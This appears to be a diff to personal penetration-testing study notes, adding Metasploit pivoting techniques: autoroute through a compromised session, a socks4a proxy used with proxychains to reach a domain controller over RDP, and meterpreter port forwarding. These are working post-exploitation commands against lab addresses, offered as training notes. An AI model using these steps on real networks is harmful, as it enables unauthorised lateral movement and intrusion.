@@ -2832,7 +2832,8 @@ meterpreter > migrate 3568
      
 *** Pivoting with the Metasploit Framework (route through established session)
     + src:
-    #+begin_src meterpreter
+      - route
+    #+begin_src msf
 C:\Users\offsec>ipconfig
   # in compromised machine
   # IPv4 Address. . . . . . . . . . . : 192.168.1.111
@@ -2848,6 +2849,53 @@ msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.110
 msf5 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
 msf5 auxiliary(scanner/portscan/tcp) > run
     #+end_src
+
+      - with =autoroute=
+    #+begin_src msf
+msf5 exploit(multi/handler) > use multi/manage/autoroute
+msf5 post(multi/manage/autoroute) > show options
+  # ...
+msf5 post(multi/manage/autoroute) > sessions -l
+msf5 post(multi/manage/autoroute) > set session 4
+msf5 post(multi/manage/autoroute) > run
+    #+end_src
+    
+      - Note: The successive connection which is routed must be must be a *bind shell*, since the route is only added in the host machine. The target machine has no routing info related to the host.
+
+      - combine route with server/socks4a, thus allows *applications outside the msf* to tunnel through the pivot.
+    #+begin_src msf
+msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a
+msf5 auxiliary(server/socks4a) > show options
+msf5 auxiliary(server/socks4a) > set SRVHOST 127.0.0.1
+  # The address to listen on, default SRVPORT 1080
+msf5 auxiliary(server/socks4a) > run
+    #+end_src
+
+    #+begin_src sh
+sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
+  # the ProxyChains .conf file.
+sudo proxychains rdesktop 192.168.1.110
+  # e.g. to obtain GUI access to the DC through the pivot.
+    #+end_src
+
+      - =portfwd= command from meterpreter, similar effect, forward a port to the internal network.
+    #+begin_src meterpreter
+meterpreter > portfwd -h
+  # show help
+meterpreter > portfwd add -l 3389 -p 3389 -r 192.168.1.110
+  # -l <lPort> local port to listen on.
+  # -p <rPort> remote port to connect to.
+  # -r <ip> remote host to connect to.
+    #+end_src
+
+    #+begin_src sh
+rdesktop 127.0.0.1
+  # ? connect with kerberos tgt
+    #+end_src
+    
+** Metasploit Automation
+
+
 
 * TODO list
   + AD, LDAP enum users
